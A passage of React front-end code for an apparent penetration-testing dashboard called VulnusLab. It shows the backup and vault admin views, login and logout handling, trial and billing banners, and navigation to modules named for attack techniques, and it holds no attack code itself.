            <div style={{padding:32,color:"#94a3b8",textAlign:"center",fontSize:14}}>
              No snapshots yet. Click "+ Take Snapshot Now" to create your first one.
            </div>
          ) : (
            <table style={{width:"100%",borderCollapse:"collapse"}}>
              <thead>
                <tr style={{background:"#1e293b"}}>
                  <th style={{padding:"10px 16px",textAlign:"left",fontSize:11,color:"#94a3b8",letterSpacing:1}}>NAME</th>
                  <th style={{padding:"10px 16px",textAlign:"left",fontSize:11,color:"#94a3b8",letterSpacing:1}}>CREATED (UTC)</th>
                  <th style={{padding:"10px 16px",textAlign:"right",fontSize:11,color:"#94a3b8",letterSpacing:1}}>SIZE</th>
                  <th style={{padding:"10px 16px",textAlign:"right",fontSize:11,color:"#94a3b8",letterSpacing:1}}>ACTIONS</th>
                </tr>
              </thead>
              <tbody>
                {snapshots.map(s => (
                  <tr key={s.name} style={{borderTop:"1px solid #1e293b"}}>
                    <td style={{padding:"10px 16px",fontFamily:"JetBrains Mono,monospace",fontSize:13}}>{s.name}</td>
                    <td style={{padding:"10px 16px",fontSize:13,color:"#94a3b8"}}>{s.created_iso}</td>
                    <td style={{padding:"10px 16px",fontSize:13,textAlign:"right"}}>{fmt(s.size_bytes)}</td>
                    <td style={{padding:"10px 16px",textAlign:"right",whiteSpace:"nowrap"}}>
                      <button onClick={()=>restoreSnapshot(s.name)} disabled={loading}
                        style={{padding:"6px 12px",background:"#3b82f6",color:"#fff",border:"none",borderRadius:6,fontSize:12,fontWeight:600,cursor:"pointer",marginRight:6}}>
                        Restore
                      </button>
                      <button onClick={()=>deleteSnapshot(s.name)} disabled={loading}
                        style={{padding:"6px 12px",background:"#dc2626",color:"#fff",border:"none",borderRadius:6,fontSize:12,fontWeight:600,cursor:"pointer"}}>
                        Delete
                      </button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>
    </div>
  );
}


// ═══════════════════════════════════════════════════════════════════
function AdminVaultModule({token}) {
  const [status, setStatus] = useState(null);
  const [days, setDays] = useState([]);
  const [loading, setLoading] = useState(false);
  const [msg, setMsg] = useState(null);

  const refresh = async () => {
    try {
      const s = await api("/api/admin/vault/status", "GET", null, token);
      const l = await api("/api/admin/vault/list",   "GET", null, token);
      setStatus(s);
      setDays(l.days || []);
    } catch(e) { setMsg({type:"error", text: e.message}); }
  };

  useEffect(() => { refresh(); }, []);

  const forceSync = async () => {
    if (!window.confirm("Force-run VAULT sync now?\n\nNormally runs nightly at 02:30 UTC.")) return;
    setLoading(true); setMsg(null);
    try {
      const r = await api("/api/admin/vault/sync", "POST", {}, token);
      setMsg({type: r.ok ? "success" : "error",
        text: r.ok ? `Synced — ${r.users} users, ${r.tools} tools, db=${r.db}` : `Sync had ${r.errors.length} error(s)`});
      await refresh();
    } catch(e) { setMsg({type:"error", text: e.message}); }
    finally { setLoading(false); }
  };

  const fmt = b => !b ? "0 B" : b < 1024 ? b+" B" : b < 1048576 ? (b/1024).toFixed(1)+" KB" : (b/1048576).toFixed(1)+" MB";

  return (
    <div style={{padding:"24px 32px",color:"#e2e8f0",minHeight:"100vh",overflow:"auto"}}>
      <div style={{maxWidth:1200,margin:"0 auto"}}>
        <h1 style={{fontSize:26,fontWeight:700,marginBottom:6}}>🔐 VAULT — Master Archive</h1>
        <p style={{color:"#94a3b8",marginBottom:24,fontSize:14}}>
          Encrypted nightly archive of every user's snapshots + tool last-known-good + users.db. Auto-runs at 02:30 UTC. AES-128 + HMAC via Fernet.
        </p>
        <div style={{display:"grid",gridTemplateColumns:"repeat(3,1fr)",gap:16,marginBottom:20}}>
          <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:10,padding:16}}>
            <div style={{color:"#94a3b8",fontSize:11,letterSpacing:1,marginBottom:6}}>ARCHIVED DAYS</div>
            <div style={{fontSize:28,fontWeight:700,color:"#3b82f6"}}>{status?.archived_days ?? "—"}</div>
          </div>
          <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:10,padding:16}}>
            <div style={{color:"#94a3b8",fontSize:11,letterSpacing:1,marginBottom:6}}>VAULT SIZE</div>
            <div style={{fontSize:28,fontWeight:700,color:"#3b82f6"}}>{fmt(status?.total_size_bytes)}</div>
          </div>
          <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:10,padding:16}}>
            <div style={{color:"#94a3b8",fontSize:11,letterSpacing:1,marginBottom:6}}>LAST SYNC (UTC)</div>
            <div style={{fontSize:13,fontWeight:600,color:"#3b82f6",fontFamily:"JetBrains Mono,monospace",wordBreak:"break-all"}}>
              {status?.last_sync_iso || "never"}
            </div>
          </div>
        </div>
        <div style={{display:"flex",gap:12,marginBottom:20}}>
          <button onClick={forceSync} disabled={loading}
            style={{padding:"10px 18px",background:"#3b82f6",color:"#fff",border:"none",borderRadius:8,fontWeight:600,cursor:loading?"wait":"pointer",fontSize:14}}>
            {loading ? "Syncing..." : "🔄 Sync VAULT Now"}
          </button>
          <button onClick={refresh}
            style={{padding:"10px 18px",background:"#1e293b",color:"#e2e8f0",border:"1px solid #334155",borderRadius:8,fontWeight:600,cursor:"pointer",fontSize:14}}>
            ↻ Refresh
          </button>
        </div>
        {msg && (
          <div style={{padding:"10px 16px",borderRadius:8,marginBottom:16,background: msg.type==="error" ? "#7f1d1d" : "#14532d", color:"#fff",fontSize:14}}>
            {msg.text}
          </div>
        )}
        <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:10,overflow:"hidden"}}>
          <div style={{padding:"12px 16px",borderBottom:"1px solid #1e293b",fontWeight:600,fontSize:14}}>
            Archive Days — kept 30 days, then auto-pruned
          </div>
          {days.length === 0 ? (
            <div style={{padding:32,color:"#94a3b8",textAlign:"center",fontSize:14}}>
              No archives yet. Click "Sync VAULT Now" to create the first one.
            </div>
          ) : (
            <table style={{width:"100%",borderCollapse:"collapse"}}>
              <thead>
                <tr style={{background:"#1e293b"}}>
                  <th style={{padding:"10px 16px",textAlign:"left",fontSize:11,color:"#94a3b8",letterSpacing:1}}>DATE</th>
                  <th style={{padding:"10px 16px",textAlign:"right",fontSize:11,color:"#94a3b8",letterSpacing:1}}>USERS</th>
                  <th style={{padding:"10px 16px",textAlign:"right",fontSize:11,color:"#94a3b8",letterSpacing:1}}>TOOLS</th>
                  <th style={{padding:"10px 16px",textAlign:"center",fontSize:11,color:"#94a3b8",letterSpacing:1}}>DB</th>
                  <th style={{padding:"10px 16px",textAlign:"right",fontSize:11,color:"#94a3b8",letterSpacing:1}}>ERRORS</th>
                </tr>
              </thead>
              <tbody>
                {days.map(d => (
                  <tr key={d.date} style={{borderTop:"1px solid #1e293b"}}>
                    <td style={{padding:"10px 16px",fontFamily:"JetBrains Mono,monospace",fontSize:13}}>{d.date}</td>
                    <td style={{padding:"10px 16px",fontSize:13,textAlign:"right"}}>{d.manifest?.users?.length ?? 0}</td>
                    <td style={{padding:"10px 16px",fontSize:13,textAlign:"right"}}>{d.manifest?.tools?.length ?? 0}</td>
                    <td style={{padding:"10px 16px",fontSize:13,textAlign:"center",color:d.manifest?.db?"#22c55e":"#94a3b8"}}>
                      {d.manifest?.db ? "✓" : "—"}
                    </td>
                    <td style={{padding:"10px 16px",fontSize:13,textAlign:"right",color:d.manifest?.errors?.length ? "#dc2626" : "#94a3b8"}}>
                      {d.manifest?.errors?.length ?? 0}
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>
    </div>
  );
}


export default function App() {
  const [token,setToken]       = useState(() => localStorage.getItem("cyberToken") || null);
  const [role,setRole]         = useState(() => localStorage.getItem("cyberRole") || "");
  const [username,setUsername] = useState(() => localStorage.getItem("cyberUser") || "");
  const [plan,setPlan]         = useState(() => localStorage.getItem("cyberPlan") || "trial");
  const [active,setActive]     = useState("dashboard");
  useEffect(() => {
    const mod = MODULES.find(m => m.id === active);
    document.title = `VulnusLab — ${mod ? mod.label : "Dashboard"}`;
  }, [active]);
  const [upgModal,setUpgModal] = useState(false);
  const [backendOk,setBE]      = useState(null);
  const [time,setTime]         = useState(new Date().toLocaleTimeString());
  const [waptRunning,setWaptRunning]       = useState(false);
  const [reconRunning,setReconRunning]     = useState(false);
  const [vulnRunning,setVulnRunning]       = useState(false);

  const handleLogin = (t, r, u, p) => {
    setToken(t); setRole(r); setUsername(u); setPlan(p);
    localStorage.setItem("cyberToken", t);
    localStorage.setItem("cyberRole", r);
    localStorage.setItem("cyberUser", u);
    localStorage.setItem("cyberPlan", p);
  };

  const handleLogout = () => {
    // Nuclear logout — wipe ALL local state so the next user on this browser
    // starts with a completely fresh dashboard. No scan caches, no target history,
    // no module state, no auth tokens, no API keys persist between sessions.
    try {
      // Wipe localStorage entirely except cyberApiUrl (deployment-level setting,
      // not user-specific — used by the app to know which backend to talk to)
      const preserve = {};
      const apiUrlSaved = localStorage.getItem("cyberApiUrl");
      if (apiUrlSaved) preserve.cyberApiUrl = apiUrlSaved;
      localStorage.clear();
      Object.entries(preserve).forEach(([k, v]) => localStorage.setItem(k, v));
      // Also wipe sessionStorage (any one-tab cached scan results)
      sessionStorage.clear();
    } catch {}
    setToken(null); setRole(""); setUsername(""); setPlan("trial");
    // Force a full page reload so every React component remounts with empty state.
    // This guarantees no in-memory scan results, history, or module state leak
    // to the next user on the same browser.
    setTimeout(() => { window.location.replace("/"); }, 30);
  };

  const [trialInfo, setTrialInfo] = useState(null);
  const [billingInfo, setBillingInfo] = useState(null);
  const [upgrading, setUpgrading] = useState(false);

  useEffect(() => {
    api("/api/health").then(() => setBE(true)).catch(() => setBE(false));
    const t = setInterval(() => setTime(new Date().toLocaleTimeString()), 1000);
    return () => clearInterval(t);
  }, []);

  useEffect(() => {
    if (token && plan === "trial") {
      api("/api/trial/status","GET",null,token).then(d=>setTrialInfo(d)).catch(()=>{});
    }
    if (token) {
      api("/api/billing/status","GET",null,token).then(d=>setBillingInfo(d)).catch(()=>{});
    }
  }, [token, plan]);

  // After returning from Lemon Squeezy checkout, refresh billing status
  useEffect(() => {
    if (typeof window !== "undefined" && window.location.search.includes("billing=success") && token) {
      // Webhooks take a few seconds; poll for 30s
      let tries = 0;
      const iv = setInterval(() => {
        tries++;
        api("/api/billing/status","GET",null,token).then(d => {
          setBillingInfo(d);
          if (d.access === "pro" || tries >= 10) {
            clearInterval(iv);
            // Clean the URL
            window.history.replaceState({}, "", window.location.pathname);
          }
        }).catch(()=>{});
      }, 3000);
      return () => clearInterval(iv);
    }
  }, [token]);

  const handleUpgrade = async () => {
    if (upgrading) return;
    setUpgrading(true);
    try {
      const res = await api("/api/billing/checkout", "POST",
        { redirect_url: window.location.origin + "/?billing=success" }, token);
      if (res && res.url) {
        window.location.href = res.url;
      } else {
        alert("Could not start checkout. Please try again or email support@vulnuslab.com.");
        setUpgrading(false);
      }
    } catch (e) {
      const msg = (e && e.message) || "Unknown error";
      if (msg.includes("503") || msg.toLowerCase().includes("not configured")) {
        alert("Payments are not configured yet. Please contact support@vulnuslab.com to upgrade.");
      } else {
        alert("Upgrade failed: " + msg);
      }
      setUpgrading(false);
    }
  };

  if (!token) {
    return <Login onLogin={handleLogin}/>;
  }

  const isSuperAdmin = role === "superadmin";
  const isPro        = isSuperAdmin || plan === "pro" || plan === "superadmin" || role === "admin";
  const isTrial      = !isPro;

  const canAccess = (m) => {
    if (isSuperAdmin) return true;           // ADMIN sees everything
    if (m.admin)      return false;          // admin-only modules hidden from non-admins
    if (m.free)       return true;           // free for everyone
    if (m.trial && isTrial) return true;     // trial modules for trial users
    if (isPro)        return true;           // pro users see everything
    return false;
  };

  const topic = MODULES.find(m => m.id === active);

  const SECTIONS = [
    { key:"recon",    label:"RECONNAISSANCE",    color:"#06b6d4" },
    { key:"scan",     label:"SCANNING",          color:"#3b82f6" },
    { key:"exploit",  label:"EXPLOITATION",      color:"#ef4444" },
    { key:"post",     label:"POST-EXPLOITATION", color:"#f59e0b" },
    { key:"network",  label:"NETWORK & INFRA",   color:"#22c55e" },
    { key:"advanced", label:"ADVANCED",          color:"#a855f7" },
    { key:"data",     label:"DATA PROTECTION",   color:"#10b981" },
    { key:"admin",    label:"ADMIN",             color:"#dc2626" },
    { key:"tools",    label:"TOOLS & REPORTS",   color:"#64748b" },
  ];

  const handleNavClick = (m) => {
    if (!canAccess(m)) { setUpgModal(true); return; }
    setActive(m.id);
  };

  const renderContent = () => {
    // If the active module is marked comingSoon, render a Coming Soon placeholder
    // instead of the broken/empty module UI. Admin (superadmin) still sees real UI
    // so they can test in-progress modules.
    const activeMod = MODULES.find(m => m.id === active);
    if (activeMod && activeMod.comingSoon && !isSuperAdmin) {
      return (
        <div style={{padding:"60px 24px",maxWidth:720,margin:"0 auto",textAlign:"center"}}>
          <div style={{fontSize:64,marginBottom:16}}>{activeMod.icon}</div>
          <div style={{display:"inline-block",background:"rgba(139,92,246,0.15)",border:"1px solid rgba(139,92,246,0.4)",color:"#a78bfa",fontSize:11,fontWeight:800,padding:"5px 14px",borderRadius:20,letterSpacing:1.5,marginBottom:20}}>COMING SOON</div>
          <h1 style={{fontSize:32,fontWeight:800,color:"#f1f5f9",marginBottom:14}}>{activeMod.label}</h1>
          <p style={{fontSize:16,color:"#94a3b8",lineHeight:1.7,marginBottom:32}}>
            This module is under active development. The frontend is built but the
            backend tooling integration is not yet complete.
          </p>
          <div style={{background:"#0f172a",border:"1px solid #1e293b",borderRadius:12,padding:24,textAlign:"left",marginBottom:24}}>
            <div style={{fontSize:13,fontWeight:700,color:"#cbd5e1",marginBottom:10}}>What you can do:</div>
            <ul style={{fontSize:13,color:"#94a3b8",lineHeight:2,paddingLeft:18,margin:0}}>
              <li>Use the modules that are working today: <strong style={{color:"#3b82f6"}}>Web Application Pentesting</strong>, <strong style={{color:"#3b82f6"}}>Vulnerability Scanning</strong>, <strong style={{color:"#3b82f6"}}>Information Gathering</strong>, <strong style={{color:"#3b82f6"}}>Advanced OSINT</strong>, <strong style={{color:"#3b82f6"}}>Exploitation Techniques</strong>, <strong style={{color:"#3b82f6"}}>Buffer Overflow</strong>, <strong style={{color:"#3b82f6"}}>Password Attacks</strong></li>
              <li>Email <a href="mailto:support@vulnuslab.com" style={{color:"#3b82f6"}}>support@vulnuslab.com</a> to request priority on this module — we build the ones customers ask for first</li>
            </ul>
          </div>
          <a href="mailto:support@vulnuslab.com?subject=Module%20Request%3A%20{encodeURIComponent(activeMod.label)}"
             style={{display:"inline-block",background:"linear-gradient(135deg,#1d4ed8,#3b82f6)",color:"#fff",padding:"12px 28px",borderRadius:10,fontSize:14,fontWeight:700,textDecoration:"none"}}>
            Request {activeMod.label}
          </a>
        </div>
      );
    }
    return (
      <>
        {/* Always-mounted modules — scan survives tab switches */}
        <div style={{display: active==="webapp"   ? "block" : "none"}}>
          <WebAppModule token={token} onRunningChange={setWaptRunning} isTrial={isTrial} isSuperAdmin={isSuperAdmin}/>
        </div>
        <div style={{display: active==="recon"    ? "block" : "none"}}>
          <ReconModule token={token} onRunningChange={setReconRunning}/>
        </div>
        <div style={{display: active==="vuln"     ? "block" : "none"}}>
          <VulnModule token={token} onRunningChange={setVulnRunning}/>
        </div>
        <div style={{display: active==="password" ? "block" : "none"}}>
          <PasswordModule token={token}/>
        </div>
        <div style={{display: active==="auth" ? "block" : "none"}}>
          <AuthAttacksModule token={token}/>
        </div>
        <div style={{display: active==="network" ? "block" : "none"}}>
          <NetworkAttacksModule token={token}/>
        </div>
        <div style={{display: active==="sysexploit" ? "block" : "none"}}>
          <SystemExploitModule token={token}/>
        </div>
        <div style={{display: active==="cloud" ? "block" : "none"}}>
          <CloudAttacksModule token={token}/>
        </div>
        <div style={{display: active==="buffer"   ? "block" : "none"}}>
          <BufferOverflowModule token={token}/>
        </div>
        <div style={{display: active==="exploit"  ? "block" : "none"}}>
          <ExploitationModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="osint"    ? "block" : "none"}}>
          <OsintModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="wireless" ? "block" : "none"}}>
          <WirelessModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="ad"       ? "block" : "none"}}>
          <ActiveDirectoryModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="privesc"  ? "block" : "none"}}>
          <PrivescModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="tunnel"   ? "block" : "none"}}>
          <TunnelModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="post"     ? "block" : "none"}}>
          <PostExploitModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="av"       ? "block" : "none"}}>
          <AVEvasionModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="se"       ? "block" : "none"}}>
          <SocialEngineeringModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="malware"  ? "block" : "none"}}>
          <MalwareModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="supply"   ? "block" : "none"}}>
          <SupplyChainModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="persist"  ? "block" : "none"}}>
          <PersistenceModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="client"   ? "block" : "none"}}>
          <ClientSideModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="mobile"   ? "block" : "none"}}>
          <MobileModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="api"      ? "block" : "none"}}>
          <ApiSecModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="pivot"    ? "block" : "none"}}>
          <PivotModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="cloud"    ? "block" : "none"}}>
          <CloudModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="report"   ? "block" : "none"}}>
          <ReportModule token={token} apiUrl={API}/>
        </div>
        <div style={{display: active==="tools"    ? "block" : "none"}}>
          <ToolManagerModule token={token}/>
        </div>
        <div style={{display: active==="history"  ? "block" : "none"}}>
          <ScanHistory token={token}/>
        </div>
        <div style={{display: active==="settings" ? "block" : "none"}}>
          <SettingsModule/>
        </div>
        <div style={{display: active==="adminpanel" ? "block" : "none"}}>
          <AdminPanel token={token}/>
        </div>
        <div style={{display: active==="backups" ? "block" : "none"}}>
          <UserBackupsModule token={token}/>
        </div>
        <div style={{display: active==="vault" ? "block" : "none"}}>
          <AdminVaultModule token={token}/>
        </div>

        {active === "dashboard" && <Dashboard token={token} setActive={setActive}/>}
        {active === "health"    && <SystemHealth/>}
        {active === "msf"       && <MetasploitModule/>}
        {active === "guide"     && <GuideModule/>}
        {!["webapp","recon","vuln","password","auth","network","sysexploit","cloud","buffer","exploit",
            "osint","wireless","ad","privesc","tunnel","post","av","se","malware","supply","persist",
            "client","mobile","api","pivot","report","tools","history","settings",
            "dashboard","health","msf","guide","adminpanel","backups","vault"].includes(active) && <ComingSoon topic={topic}/>}
      </>
    );
  };

  return (
    <div style={{display:"flex",height:"100vh",background:"#020617",overflow:"hidden",fontFamily:"DM Sans,sans-serif"}}>
      <style>{CSS}</style>

      <div style={{width:280,background:"#0a0f1e",borderRight:"1px solid #1e293b",display:"flex",flexDirection:"column",flexShrink:0,overflow:"hidden"}}>
        <div style={{padding:"6px 0 8px",borderBottom:"1px solid #1e293b",flexShrink:0,background:"#0a0f1e"}}>
          <div style={{display:"flex",alignItems:"center",justifyContent:"center",gap:8,padding:"0 12px"}}>
            <img src={LOGO} alt="logo" style={{width:48,height:48,objectFit:"contain",display:"block",flexShrink:0}}/>
            <div>
              <div style={{fontSize:15,fontWeight:900,letterSpacing:2,lineHeight:1.1}}>
                <span style={{color:"#ffffff"}}>VULNUS</span><span style={{color:"#3b82f6"}}>LAB</span>
              </div>
            </div>
          </div>
          {/* Tagline — one tab space below */}
          <div style={{marginBottom:4,paddingTop:0}}><Tagline size={9}/></div>
          <div style={{background:backendOk?"#052e16":"#1c0a0a",border:"1px solid "+(backendOk?"#166534":"#7f1d1d"),borderRadius:5,padding:"8px 10px",display:"flex",alignItems:"center",gap:7}}>
            <div style={{width:6,height:6,borderRadius:"50%",background:backendOk===null?"#f59e0b":backendOk?"#22c55e":"#ef4444",animation:"pulse 2s infinite",flexShrink:0}}/>
            <div>
              <div style={{fontSize:12,color:backendOk?"#22c55e":"#f87171",fontWeight:600}}>
                {backendOk===null?"Connecting...":backendOk?"Kali Online":"Backend Offline"}
              </div>
              <div style={{fontSize:10,color:"#475569",fontFamily:"JetBrains Mono,monospace"}}>{API}</div>
            </div>
          </div>
        </div>

        <div style={{flex:1,overflowY:"auto"}}>

          {/* Dashboard — always free */}
          <div style={{padding:"8px 8px 2px"}}>
            <span style={{fontSize:10,color:"#475569",fontWeight:700,letterSpacing:1.5,padding:"0 8px",textTransform:"uppercase"}}>Overview</span>
          </div>
          {MODULES.filter(m=>m.id==="dashboard").map(m=>(
            <button key={m.id} className="nav-btn" onClick={()=>setActive(m.id)}
              style={{width:"calc(100% - 16px)",background:active===m.id?"#1e3a8a":"transparent",border:"none",borderRadius:6,padding:"9px 12px",display:"flex",alignItems:"center",gap:10,cursor:"pointer",textAlign:"left",margin:"2px 8px"}}>
              <span style={{fontSize:17,width:24,textAlign:"center",flexShrink:0}}>{m.icon}</span>
              <span style={{fontSize:13,color:active===m.id?"#f1f5f9":"#94a3b8",fontWeight:active===m.id?600:400,flex:1}}>{m.label}</span>
            </button>
          ))}

          {/* Dynamic sections */}
          {SECTIONS.map(sec => {
            const mods = MODULES.filter(m => m.cat === sec.key);
            if (!mods.length) return null;
            return (
              <div key={sec.key}>
                <div style={{padding:"10px 8px 3px"}}>
                  <span style={{fontSize:10,color:"#64748b",fontWeight:700,letterSpacing:1.4,textTransform:"uppercase"}}>{sec.label}</span>
                </div>
                {mods.map(m => {
                  const locked = !canAccess(m);
                  const isTrial = m.trial && !isPro && !isSuperAdmin;
                  const isActive = active === m.id;
                  return (
                    <button key={m.id} className="nav-btn" onClick={()=>handleNavClick(m)}
                      style={{width:"calc(100% - 16px)",background:isActive?"#1e3a8a":"transparent",border:"none",borderRadius:6,padding:"9px 12px",display:"flex",alignItems:"center",gap:9,cursor:"pointer",textAlign:"left",margin:"1px 8px",opacity:locked?0.55:1}}>
                      <span style={{fontSize:16,width:22,textAlign:"center",flexShrink:0}}>{m.icon}</span>
                      <span style={{fontSize:13,color:isActive?"#f1f5f9":locked?"#475569":"#94a3b8",fontWeight:isActive?600:500,flex:1,lineHeight:1.35,letterSpacing:"0.1px"}}>{m.label}</span>
                      {locked   && <span style={{fontSize:10}}>🔒</span>}
                      {m.comingSoon && !locked && <span style={{fontSize:8,color:"#8b5cf6",fontWeight:700,background:"rgba(139,92,246,0.15)",padding:"1px 5px",borderRadius:3,letterSpacing:0.5}}>SOON</span>}
                      {isTrial  && !locked && !m.comingSoon && <span style={{fontSize:8,color:"#f59e0b",fontWeight:700,background:"rgba(245,158,11,0.1)",padding:"1px 5px",borderRadius:3}}>TRIAL</span>}
                      {!locked && m.id==="webapp"  && waptRunning   && !isActive && <span style={{width:6,height:6,borderRadius:"50%",background:"#22c55e",animation:"pulse 1s infinite",flexShrink:0,display:"inline-block"}}/>}
                      {!locked && m.id==="recon"   && reconRunning  && !isActive && <span style={{width:6,height:6,borderRadius:"50%",background:"#22c55e",animation:"pulse 1s infinite",flexShrink:0,display:"inline-block"}}/>}
                      {!locked && m.id==="vuln"    && vulnRunning   && !isActive && <span style={{width:6,height:6,borderRadius:"50%",background:"#22c55e",animation:"pulse 1s infinite",flexShrink:0,display:"inline-block"}}/>}
                    </button>
                  );
                })}
              </div>
            );
          })}

          {/* System — always accessible */}
          <div style={{padding:"10px 8px 3px"}}>
            <span style={{fontSize:10,color:"#64748b",fontWeight:700,letterSpacing:1.4,textTransform:"uppercase"}}>System</span>
          </div>
          {[
            {id:"health",  icon:"💊", label:"System Health"},
            {id:"history", icon:"📋", label:"Scan History"},
            {id:"settings",icon:"⚙",  label:"Settings"},
            ...(isSuperAdmin ? [{id:"adminpanel", icon:"👑", label:"Admin Panel"}] : []),
          ].map(m => (
            <button key={m.id} className="nav-btn" onClick={()=>setActive(m.id)}
              style={{width:"calc(100% - 16px)",background:active===m.id?(m.id==="adminpanel"?"#3b0764":"#1e293b"):"transparent",border:"none",borderRadius:6,padding:"9px 12px",display:"flex",alignItems:"center",gap:9,cursor:"pointer",textAlign:"left",margin:"1px 8px"}}>
              <span style={{fontSize:15,width:22,textAlign:"center"}}>{m.icon}</span>
              <span style={{fontSize:13,color:active===m.id?"#f1f5f9":"#94a3b8",fontWeight:active===m.id?600:500,letterSpacing:"0.1px"}}>{m.label}</span>
            </button>
          ))}

        </div>

        {/* Upgrade modal */}
        {upgModal && (
          <div style={{position:"fixed",inset:0,background:"rgba(0,0,0,0.75)",zIndex:999,display:"flex",alignItems:"center",justifyContent:"center"}}
            onClick={()=>setUpgModal(false)}>
            <div style={{background:"#0f172a",border:"1px solid #3b82f6",borderRadius:12,padding:32,maxWidth:380,width:"90%",textAlign:"center"}}
              onClick={e=>e.stopPropagation()}>
              <div style={{fontSize:36,marginBottom:12}}>🔒</div>
              <div style={{fontSize:18,fontWeight:700,color:"#f1f5f9",marginBottom:8}}>Pro Feature</div>
              <div style={{fontSize:13,color:"#94a3b8",marginBottom:24,lineHeight:1.6}}>
                This module is available on the <strong style={{color:"#3b82f6"}}>Pro plan</strong>.<br/>
                Upgrade to unlock all {MODULES.filter(m=>!m.free).length} advanced modules.
              </div>
              <a href="mailto:awsvijju5@gmail.com?subject=CyberSecurity Dashboard Pro License"
                style={{display:"block",background:"#2563eb",color:"#fff",padding:"10px 24px",borderRadius:8,fontWeight:600,fontSize:14,textDecoration:"none",marginBottom:10}}>
                Contact for Pro Access
              </a>
              <button onClick={()=>setUpgModal(false)}
                style={{background:"none",border:"none",color:"#475569",fontSize:13,cursor:"pointer"}}>
                Maybe later
              </button>
            </div>
          </div>
        )}
        <div style={{padding:"10px 12px",borderTop:"1px solid #1e293b",flexShrink:0}}>
          <div style={{display:"flex",justifyContent:"space-between",alignItems:"center"}}>
            <div style={{fontSize:11,color:"#94a3b8",fontFamily:"JetBrains Mono,monospace",fontWeight:600}}>{username} <span style={{color:"#334155"}}>·</span> <span style={{color:plan==="pro"?"#f59e0b":"#475569"}}>{plan}</span></div>
            <button onClick={handleLogout} style={{background:"none",border:"none",color:"#475569",fontSize:10,cursor:"pointer",letterSpacing:1}}>Sign out</button>
          </div>
          <div style={{textAlign:"center",fontSize:11,color:"#334155",fontFamily:"JetBrains Mono,monospace",marginTop:4}}>{time}</div>
        </div>
      </div>

      <div style={{flex:1,display:"flex",flexDirection:"column",overflow:"hidden"}}>

        {/* Grace period banner — trial expired but 3 grace days */}
        {billingInfo && billingInfo.access === "grace" && (
          <div style={{background:"#1c0a00",borderBottom:"1px solid #78350f",padding:"10px 24px",display:"flex",alignItems:"center",gap:16,flexShrink:0}}>
            <span style={{fontSize:18}}>⚠️</span>
            <div style={{flex:1}}>
              <span style={{fontSize:13,fontWeight:700,color:"#fb923c"}}>
                Your trial has ended. You have {billingInfo.grace_days_remaining} grace day{billingInfo.grace_days_remaining!==1?"s":""} of full access remaining — subscribe now to keep scanning.
              </span>
            </div>
            <button onClick={handleUpgrade} disabled={upgrading} style={{background:"linear-gradient(135deg,#dc2626,#ea580c)",border:"none",color:"#fff",padding:"7px 18px",borderRadius:6,fontSize:12,fontWeight:800,cursor:upgrading?"wait":"pointer",whiteSpace:"nowrap"}}>
              {upgrading ? "Loading..." : "Subscribe — $29/mo"}
            </button>
          </div>
        )}

        {/* Expired banner — trial + grace exhausted, locked out */}
        {billingInfo && billingInfo.access === "expired" && (
          <div style={{background:"#1c0000",borderBottom:"2px solid #7f1d1d",padding:"14px 24px",display:"flex",alignItems:"center",gap:16,flexShrink:0}}>
            <span style={{fontSize:20}}>🚫</span>
            <div style={{flex:1}}>
              <div style={{fontSize:14,fontWeight:800,color:"#fca5a5"}}>Trial expired</div>
              <div style={{fontSize:12,color:"#fecaca",marginTop:2}}>Subscribe to VulnusLab Pro to continue running scans. Your past scans are still accessible.</div>
            </div>
            <button onClick={handleUpgrade} disabled={upgrading} style={{background:"linear-gradient(135deg,#16a34a,#15803d)",border:"none",color:"#fff",padding:"9px 22px",borderRadius:6,fontSize:13,fontWeight:800,cursor:upgrading?"wait":"pointer",whiteSpace:"nowrap",boxShadow:"0 0 16px #16a34a55"}}>
              {upgrading ? "Loading..." : "Subscribe — $29/mo"}
            </button>
          </div>
        )}

        {/* Trial Banner — within trial window */}
        {isTrial && billingInfo && billingInfo.access === "trial" && trialInfo && (
          <div style={{background: trialInfo.scans_remaining===0 ? "#1c0000" : (billingInfo.trial_days_remaining<=2 ? "#1c0a00" : "#0c1a0c"),
            borderBottom:`1px solid ${trialInfo.scans_remaining===0?"#7f1d1d":(billingInfo.trial_days_remaining<=2?"#78350f":"#166534")}`,
            padding:"8px 24px",display:"flex",alignItems:"center",gap:16,flexShrink:0}}>
            <span style={{fontSize:16}}>{trialInfo.scans_remaining===0?"🚫":(billingInfo.trial_days_remaining<=2?"⚠️":"🎯")}</span>
            <div style={{flex:1}}>
              <span style={{fontSize:12,fontWeight:700,color:trialInfo.scans_remaining===0?"#f87171":(billingInfo.trial_days_remaining<=2?"#fb923c":"#4ade80")}}>
                {trialInfo.scans_remaining===0
                  ? "Daily scan limit reached — upgrade to Pro for unlimited scans"
                  : `Trial: ${billingInfo.trial_days_remaining} day${billingInfo.trial_days_remaining!==1?"s":""} left  •  ${trialInfo.scans_remaining} scan${trialInfo.scans_remaining!==1?"s":""} remaining today`}
              </span>
            </div>
            <div style={{display:"flex",gap:6}}>
              {[...Array(5)].map((_,i)=>(
                <div key={i} style={{width:10,height:10,borderRadius:"50%",
                  background:i<(5-trialInfo.scans_remaining)?"#1e293b":"#22c55e",
                  border:"1px solid #334155"}}/>
              ))}
